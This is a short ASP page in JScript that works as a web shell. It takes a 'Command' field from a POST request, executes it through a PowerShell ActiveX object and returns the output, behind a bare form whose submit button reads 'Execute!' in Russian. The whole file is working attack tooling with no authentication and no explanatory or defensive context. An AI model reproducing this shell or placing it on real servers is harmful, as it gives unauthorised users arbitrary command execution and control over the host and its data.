<%@Language='JScript'%>
<%
if('POST'==Request.ServerVariables('REQUEST_METHOD'))
{
 Response.ContentType='text/plain';
 var Z=Server.CreateObject("SAPIEN.ActiveXPoSH");
 Z.Init(false);
// Response.Write('Powershell is '+(Z.IsPowerShellInstalled?'ok':'missing'));
 Z.Execute(Request.Form('Command'));
 Response.Write(Z.OutputString);
 Response.End();
}
%>
<Form Action='./' Method='POST'>
<TextArea Name='Command' Rows='5' Style='width: 100%;'>
</TextArea>
<P />
<Input Type='Submit' Value='Исполнить!' />
</Form>
